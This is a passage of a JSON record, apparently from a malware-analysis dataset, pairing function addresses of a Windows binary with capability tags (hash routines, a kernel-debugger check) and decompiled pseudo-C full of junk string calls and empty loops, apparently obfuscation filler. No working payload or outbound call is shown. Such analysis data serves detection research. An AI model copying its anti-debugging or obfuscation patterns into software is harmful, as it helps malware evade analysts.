            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405cc2(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iStack68;\n    \n    fcn.00401e79(\"qyaawuttxruapmxnonwjzxidtvphpvqcqrzxvhbmnwlhib\");\n    for (iStack68 = 0x1b; 0 < iStack68; iStack68 = iStack68 + -1) {\n    }\n    for (iVar1 = 0x3c; 0 < iVar1; iVar1 = iVar1 + -1) {\n    }\n    fcn.00403b02();\n    return 1;\n}\n",
        "token_count": 156
    },
    "00405d17": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.00405d17(void)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t var_115h;\n    uint var_110h;\n    uint var_f8h;\n    int32_t var_e0h;\n    int32_t var_dch;\n    uint var_d8h;\n    uint var_c0h;\n    int32_t var_a8h;\n    uint var_a4h;\n    uint var_8ch;\n    uint var_74h;\n    uint var_5ch;\n    uint var_44h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xfffffedc;\n    var_10h = 0xffffffff;\n    var_14h = 0x450100;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_24h = 0x1127;\n    var_28h = 0x373;\n    var_2ch = 0x160a;\n    fcn.00401e79(\"ueczdedwsqsziswtntcuymjomnehrkyjplzonwayekxpqujinubkgghrxjparhfqttaeccwxoxrnrcsefqakjvfpqohxreibfaun\")\n    ;\n    var_10h = 0;\n    fcn.00401e79(\"lvncgjftyjpxkwxkfhtajwahwe\");\n    var_10h = 1;\n    fcn.00401e79(\"rgyddokjclntdcpbbrsrnkksfadkycas\");\n    var_10h = 2;\n    fcn.00401e79(\"rgyddokjclntdcpbbrsrnkksfadkycas\");\n    var_10h = 5;\n    fcn.00401e79(\"rgyddokjclntdcpbbrsrnkksfadkycas\");\n    uVar1 = fcn.00405b37(&var_a4h, &var_8ch);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_a8h = 0x62; 0 < var_a8h; var_a8h = var_a8h + -1) {\n        }\n    }\n    var_10h = 2;\n    fcn.00401e79(\"ueczdedwsqsziswtntcuymjomnehrkyjplzonwayekxpqujinubkgghrxjparhfqttaeccwxoxrnrcsefqakjvfpqohxreibfaun\")\n    ;\n    var_10h = 4;\n    fcn.00401e79(\"ueczdedwsqsziswtntcuymjomnehrkyjplzonwayekxpqujinubkgghrxjparhfqttaeccwxoxrnrcsefqakjvfpqohxreibfaun\")\n    ;\n    uVar1 = fcn.004042dc(&var_d8h, &var_c0h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_dch = 0x11; 0 < var_dch; var_dch = var_dch + -1) {\n        }\n    }\n    for (var_e0h = 0x2d; 0 < var_e0h; var_e0h = var_e0h + -1) {\n    }\n    var_10h = 2;\n    fcn.00401e79(\"ueczdedwsqsziswtntcuymjomnehrkyjplzonwayekxpqujinubkgghrxjparhfqttaeccwxoxrnrcsefqakjvfpqohxreibfaun\")\n    ;\n    var_10h = 3;\n    fcn.00401e79(\"ueczdedwsqsziswtntcuymjomnehrkyjplzonwayekxpqujinubkgghrxjparhfqttaeccwxoxrnrcsefqakjvfpqohxreibfaun\")\n    ;\n    uVar1 = fcn.00405b37(&var_110h, &var_f8h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (stack0xfffffee8 = 0x14; 0 < stack0xfffffee8; *NULL = stack0xfffffee8 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return 0x10f77;\n}\n",
        "token_count": 1136
    },
    "00405db2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00405db2(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_8ch;\n    uint var_74h;\n    uint var_5ch;\n    uint var_44h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_10h = 0xffffffff;\n    var_14h = 0x451100;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    fcn.00401e79(\"ezwxogfwxyozkrmkizypaqrtlifjdsn\");\n    var_10h = 0;\n    fcn.00401e79(\"itncemuxfkioppracaxmneenzsiwnsjatrcfceqfyvljamhurkscnkmnhxpa\");\n    var_10h = 1;\n    fcn.00401e79(\"zvsbijbwqmfhsnui\");\n    var_10h = 2;\n    fcn.00401e79(0x54c997);\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return *0x547184;\n}\n",
        "token_count": 349
    },
    "00405db7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00405db7(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_00000014;\n    int32_t iStack224;\n    uchar auStack220 [24];\n    uchar auStack196 [24];\n    int32_t iStack172;\n    uchar auStack168 [24];\n    uchar auStack144 [75];\n    uchar uStack69;\n    uint uStack68;\n    uint8_t uStack57;\n    ulong uStack56;\n    ulong uStack48;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff10;\n    uStack48 = CONCAT44(in_stack_00000014, arg_14h);\n    uStack56 = CONCAT44(noname_2, arg_ch);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x44fe00;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack57 = arg_8h & 1;\n    uStack68 = 0x891;\n    uStack69 = 1;\n    fcn.00401e79(\"fqkjyrjmkwkdsuerqscdsowlmizrhacyvjgaqd\");\n    uStack24 = 0;\n    fcn.00401e79(\"dosceymawkybygozqmymmpqjjfpchvmeupgvcpavumpeyqkpnwtdxvicvbvdj\");\n    uStack24 = 1;\n    fcn.00401e79(\"fqkjyrjmkwkdsuerqscdsowlmizrhacyvjgaqd\");\n    uStack24 = 3;\n    fcn.00401e79(\"fqkjyrjmkwkdsuerqscdsowlmizrhacyvjgaqd\");\n    uVar1 = fcn.00405b37(auStack168, auStack144);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack172 = 0x3e; 0 < iStack172; iStack172 = iStack172 + -1) {\n        }\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"dosceymawkybygozqmymmpqjjfpchvmeupgvcpavumpeyqkpnwtdxvicvbvdj\");\n    uStack24 = 2;\n    fcn.00401e79(\"dosceymawkybygozqmymmpqjjfpchvmeupgvcpavumpeyqkpnwtdxvicvbvdj\");\n    uVar1 = fcn.004042dc(auStack220, auStack196);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack224 = 1; 0 < iStack224; iStack224 = iStack224 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 1;\n}\n",
        "token_count": 775
    },
    "00405dfd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405dfd(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *in_ECX;\n    \n    if (((*(*in_ECX + 0xc) >> 0xc & 1) == 0) || (*(*in_ECX + 4) != 0)) {\n        uVar1 = fcn.00404705(arg_8h, *in_ECX);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 != 0xffffffff;\n    }\n    else {\n        uVar1 = CONCAT31(*in_ECX >> 8, 1);\n    }\n    return uVar1;\n}\n",
        "token_count": 152
    },
    "00405e66": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl\nfcn.00405e66(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint noname_4, uint arg_1ch, uint noname_6, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h, uint noname_11, uint arg_38h, uint arg_3ch)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_0000003c;\n    int32_t iStack344;\n    uchar auStack340 [24];\n    uchar auStack316 [24];\n    int32_t iStack292;\n    uchar auStack288 [24];\n    uchar auStack264 [24];\n    int32_t iStack240;\n    uchar auStack236 [24];\n    uchar auStack212 [24];\n    int32_t iStack188;\n    uchar auStack184 [24];\n    uchar auStack160 [48];\n    uint uStack112;\n    uint uStack108;\n    uint8_t uStack97;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    uint8_t uStack65;\n    ulong uStack64;\n    uchar uStack49;\n    ulong uStack48;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffe98;\n    uStack48 = CONCAT44(in_stack_0000003c, arg_3ch);\n    uStack64 = CONCAT44(noname_11, arg_30h);\n    uStack80 = CONCAT44(noname_6, arg_1ch);\n    uStack88 = CONCAT44(noname_4, arg_14h);\n    uStack96 = CONCAT44(noname_2, arg_ch);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x4513a0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uVar2 = CONCAT11(arg_38h, arg_8h) & 0x1ff;\n    uStack49 = uVar2 >> 8;\n    uStack65 = arg_28h & 1;\n    uStack97 = uVar2 & 1;\n    uStack108 = 0x40d3af00;\n    uStack112 = 0;\n    fcn.00401e79(\"rzsvciybbfxxpinjyoxejschigsucjohzglwhsuznxlxsevylhbdynbrnzriintxtkyansfj\");\n    uStack24 = 0;\n    fcn.00401e79(\"rzsvciybbfxxpinjyoxejschigsucjohzglwhsuznxlxsevylhbdynbrnzriintxtkyansfj\");\n    uStack24 = 4;\n    fcn.00401e79(\"rzsvciybbfxxpinjyoxejschigsucjohzglwhsuznxlxsevylhbdynbrnzriintxtkyansfj\");\n    uVar1 = fcn.004042dc(auStack184, auStack160);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack188 = 0x5d; 0 < iStack188; iStack188 = iStack188 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"rzsvciybbfxxpinjyoxejschigsucjohzglwhsuznxlxsevylhbdynbrnzriintxtkyansfj\");\n    uStack24 = 3;\n    fcn.00401e79(\"rzsvciybbfxxpinjyoxejschigsucjohzglwhsuznxlxsevylhbdynbrnzriintxtkyansfj\");\n    uVar1 = fcn.004042dc(auStack236, auStack212);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack240 = 0xc; 0 < iStack240; iStack240 = iStack240 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"rzsvciybbfxxpinjyoxejschigsucjohzglwhsuznxlxsevylhbdynbrnzriintxtkyansfj\");\n    uStack24 = 2;\n    fcn.00401e79(\"rzsvciybbfxxpinjyoxejschigsucjohzglwhsuznxlxsevylhbdynbrnzriintxtkyansfj\");\n    uVar1 = fcn.004042dc(auStack288, auStack264);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack292 = 0x3d; 0 < iStack292; iStack292 = iStack292 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"rzsvciybbfxxpinjyoxejschigsucjohzglwhsuznxlxsevylhbdynbrnzriintxtkyansfj\");\n    uStack24 = 1;\n    fcn.00401e79(\"rzsvciybbfxxpinjyoxejschigsucjohzglwhsuznxlxsevylhbdynbrnzriintxtkyansfj\");\n    uVar1 = fcn.00405b37(auStack340, auStack316);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack344 = 1; 0 < iStack344; iStack344 = iStack344 + -1) {\n        }\n    }\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 1;\n}\n",
        "token_count": 1445
    },
    "00405ec0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405ec0(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    int32_t var_c4h;\n    uint var_c0h;\n    uint var_a8h;\n    int32_t var_90h;\n    uint var_8ch;\n    uint var_74h;\n    int32_t var_5ch;\n    uchar var_55h;\n    uint var_54h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff1c;\n    var_14h = 0x450a00;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 3;\n    fcn.00401e79(\"ctxpprgxdznhmwtgldafgudkoxnxlabwvpvrjpifbtjyhkqkwxuhjhdjdijjqyripqnfvhwuv\");\n    var_3ch = 0xedc;\n    var_10h = 4;\n    fcn.00401e79(\"hkvnawj\");\n    var_55h = 1;\n    for (var_5ch = 0x2b; 0 < var_5ch; var_5ch = var_5ch + -1) {\n    }\n    var_10h = 5;\n    fcn.00401e79(\"hkvnawj\");\n    var_10h = 7;\n    fcn.00401e79(\"hkvnawj\");\n    uVar1 = fcn.004042dc(&var_8ch, &var_74h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_90h = 0xd; 0 < var_90h; var_90h = var_90h + -1) {\n        }\n    }\n    var_10h = 5;\n    fcn.00401e79(\"ctxpprgxdznhmwtgldafgudkoxnxlabwvpvrjpifbtjyhkqkwxuhjhdjdijjqyripqnfvhwuv\");\n    var_10h = 6;\n    fcn.00401e79(\"ctxpprgxdznhmwtgldafgudkoxnxlabwvpvrjpifbtjyhkqkwxuhjhdjdijjqyripqnfvhwuv\");\n    uVar1 = fcn.00405b37(&var_c0h, &var_a8h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_c4h = 0x2d; 0 < var_c4h; var_c4h = var_c4h + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 800
    },
    "00405eca": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint8_t __fastcall fcn.00405eca(uint8_t *param_1)\n\n{\n    uint var_4h;\n    \n    return *param_1 & 1;\n}\n",
        "token_count": 40
    },
    "00405ef2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405ef2(uint8_t *arg_8h, int32_t arg_ch, int32_t *arg_10h, int32_t **arg_14h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t *in_ECX;\n    uint8_t *puVar5;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(*in_ECX + 0xc) >> 0xc & 1) != 0) && (*(*in_ECX + 4) == 0)) {\n        *arg_10h = *arg_10h + arg_ch;\n        return;\n    }\n    piVar3 = *arg_14h;\n    if (piVar3 == NULL) {\n        piVar3 = fcn.00403a35();\n        *arg_14h = piVar3;\n    }\n    iVar1 = *piVar3;\n    puVar5 = arg_8h + arg_ch;\n    *piVar3 = 0;\n    if (arg_8h != puVar5) {\n        do {\n            cVar2 = fcn.00405dfd(*arg_8h);\n            if (cVar2 == '\\0') {\n                piVar4 = *arg_14h;\n                if (piVar4 == NULL) {\n                    piVar4 = fcn.00403a35();\n                    *arg_14h = piVar4;\n                }\n                if (*piVar4 != 0x2a) {\n                    *arg_10h = -1;\n                    break;\n                }\n                cVar2 = fcn.00405dfd(0x3f);\n                if (cVar2 != '\\0') goto code_r0x004a9b98;\n                *arg_10h = -1;\n            }\n            else {\ncode_r0x004a9b98:\n                *arg_10h = *arg_10h + 1;\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != puVar5);\n    }\n    if ((*piVar3 == 0) && (iVar1 != 0)) {\n        *piVar3 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 517
    },
    "00405f06": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405f06(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iStack84;\n    \n    for (iStack84 = 0x52; 0 < iStack84; iStack84 = iStack84 + -1) {\n    }\n    return 1;\n}\n",
        "token_count": 94
    },
    "00405f29": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.00405f29(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack172;\n    uchar auStack168 [24];\n    uchar auStack144 [24];\n    int32_t iStack120;\n    int32_t iStack116;\n    uchar uStack109;\n    uchar uStack81;\n    uint uStack80;\n    uint uStack76;\n    uchar uStack67;\n    uchar uStack66;\n    uchar uStack65;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff40;\n    uStack28 = 0x450620;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"etobvudfuqkzhstvavtcucmvpvdtpmprqvbtbhzrdixcnokoqgiouyaudglhfinapvroarobthwceoaazwfhiqubevrpjt\");\n    uStack65 = 1;\n    uStack66 = 1;\n    uStack67 = 0;\n    uStack76 = 0x40ea8cc0;\n    uStack80 = 0;\n    uStack81 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"vfvyiyjpucgfssplejjptrsxedqk\");\n    uStack109 = 1;\n    for (iStack116 = 0x17; 0 < iStack116; iStack116 = iStack116 + -1) {\n    }\n    for (iStack120 = 0x1c; 0 < iStack120; iStack120 = iStack120 + -1) {\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"vfvyiyjpucgfssplejjptrsxedqk\");\n    uStack24 = 3;\n    fcn.00401e79(\"vfvyiyjpucgfssplejjptrsxedqk\");\n    uVar1 = fcn.004042dc(auStack168, auStack144);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack172 = 0x56; 0 < iStack172; iStack172 = iStack172 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x546de4;\n}\n",
        "token_count": 637
    },
    "00405f47": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 fcn.00405f47(void)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack140;\n    uchar auStack136 [24];\n    uchar auStack112 [24];\n    uint uStack88;\n    uint uStack84;\n    uchar uStack73;\n    uint uStack72;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff60;\n    uStack24 = 0xffffffff;\n    uStack28 = 0x450b60;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x8af;\n    fcn.00401e79(\"kzwusvozhspkzhwvuzxafrjbfmchzjhwzxjnbtyvyftxtilxhnkkzizcvialyagmeqsxacnyxrxezhdywgazviziwkehrkimfb\");\n    uStack72 = 0x2e4;\n    uStack73 = 1;\n    uStack84 = 0x40c64b00;\n    uStack88 = 0;\n    uStack24 = 0;\n    fcn.00401e79(\"kzwusvozhspkzhwvuzxafrjbfmchzjhwzxjnbtyvyftxtilxhnkkzizcvialyagmeqsxacnyxrxezhdywgazviziwkehrkimfb\");\n    uStack24 = 1;\n    fcn.00401e79(\"kzwusvozhspkzhwvuzxafrjbfmchzjhwzxjnbtyvyftxtilxhnkkzizcvialyagmeqsxacnyxrxezhdywgazviziwkehrkimfb\");\n    uVar1 = fcn.004042dc(auStack136, auStack112);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack140 = 0x5d; 0 < iStack140; iStack140 = iStack140 + -1) {\n        }\n    }\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x546f24;\n}\n",
        "token_count": 561
    },
    "0040600a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0040600a(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack164;\n    uchar auStack160 [24];\n    uchar auStack136 [48];\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint8_t uStack37;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff48;\n    uStack24 = 0xffffffff;\n    uStack28 = 0x450340;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack37 = arg_8h & 1;\n    fcn.00401e79(\"wyfphyvtjbzoxdcxerovgmtsrftvcqakijrezqozjkdpxfjc\");\n    uStack72 = 0x18e8;\n    uStack76 = 0x40ba8c00;\n    uStack80 = 0;\n    uStack84 = 0x4090b000;\n    uStack88 = 0;\n    uStack24 = 0;\n    fcn.00401e79(\"kkbgqsivgnvezxpgabnydvnjjwvj\");\n    uStack24 = 1;\n    fcn.00401e79(\"wyfphyvtjbzoxdcxerovgmtsrftvcqakijrezqozjkdpxfjc\");\n    uStack24 = 2;\n    fcn.00401e79(\"wyfphyvtjbzoxdcxerovgmtsrftvcqakijrezqozjkdpxfjc\");\n    uVar1 = fcn.00405b37(auStack160, auStack136);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack164 = 0x52; 0 < iStack164; iStack164 = iStack164 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 547
    },
    "0040601e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint fcn.0040601e(void)\n\n{\n    fcn.00401e79(\"bhvzdcyitxilnsrelbtkmilhnjrtxrlmdeniopbqmpkgorlqymvetjldpowpsqygukdacckctbgfdggaaugadybxguvrwr\");\n    fcn.00403b02();\n    return 1;\n}\n",
        "token_count": 87
    },
    "0040607d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl\nfcn.0040607d(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint noname_5, uint arg_20h, \n            uint noname_7, uint arg_28h, uint arg_2ch)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_0000002c;\n    int32_t iStack304;\n    uchar auStack300 [24];\n    uchar auStack276 [24];\n    int32_t iStack252;\n    uchar auStack248 [24];\n    uchar auStack224 [72];\n    uint uStack152;\n    uint uStack148;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar uStack77;\n    ulong uStack72;\n    ulong uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffeb8;\n    uStack48 = CONCAT44(in_stack_0000002c, arg_2ch);\n    uStack56 = CONCAT44(noname_7, arg_20h);\n    uStack64 = CONCAT44(noname_5, arg_18h);\n    uStack72 = CONCAT44(noname_2, arg_ch);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x4514a0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack77 = 1;\n    uStack84 = 0x40d25f80;\n    uStack88 = 0;\n    uStack92 = 0x40be3c00;\n    uStack96 = 0;\n    fcn.00401e79(\"tuqhmosqxs\");\n    uStack24 = 0;\n    fcn.00401e79(\"cyngjfmvofwszrhdcfkzvufayetaasewdtthij\");\n    uStack148 = 0x40be1100;\n    uStack152 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"nhewuqlmbrxkfjbikajuxuyvvayjgcetetyusgwapqadlhlkdhozhrv\");\n    uStack24 = 2;\n    fcn.00401e79(\"rezvwjkbpyqwcbivwszxvhwuamnfrbynlrvtbcfjyftlvb\");\n    uStack24 = 3;\n    fcn.00401e79(\"tuqhmosqxs\");\n    uStack24 = 5;\n    fcn.00401e79(\"tuqhmosqxs\");\n    uVar1 = fcn.00405b37(auStack248, auStack224);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack252 = 0x43; 0 < iStack252; iStack252 = iStack252 + -1) {\n        }\n    }\n    uStack24 = 3;\n    fcn.00401e79(\"cyngjfmvofwszrhdcfkzvufayetaasewdtthij\");\n    uStack24 = 4;\n    fcn.00401e79(\"cyngjfmvofwszrhdcfkzvufayetaasewdtthij\");\n    uVar1 = fcn.00405b37(auStack300, auStack276);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack304 = 0x60; 0 < iStack304; iStack304 = 